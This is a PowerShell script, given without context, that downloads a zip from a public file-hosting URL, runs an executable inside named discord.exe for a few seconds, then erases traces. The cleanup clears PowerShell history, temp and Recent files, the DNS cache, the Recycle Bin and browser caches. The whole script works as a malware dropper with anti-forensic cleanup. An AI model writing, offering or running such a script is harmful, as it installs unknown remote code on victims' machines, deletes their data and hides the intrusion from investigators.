$zipUrl = "https://files.catbox.moe/0tjan7.zip"

$zipPath = "$env:TEMP\work.zip"
$extractPath = "$env:TEMP\work"

Invoke-WebRequest $zipUrl -OutFile $zipPath

Expand-Archive $zipPath $extractPath -Force

$exe = Get-ChildItem $extractPath -Recurse -Filter "discord.exe" | Select-Object -First 1

if ($exe) {
    $p = Start-Process $exe.FullName -PassThru

    Start-Sleep 5

    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
}

Start-Sleep 2

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
cmd /c rmdir /s /q "$extractPath"

# PowerShell history
Clear-History
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue

# Temp
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue

# Recent files
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue

# DNS cache
ipconfig /flushdns

# Recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Browser cache only
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
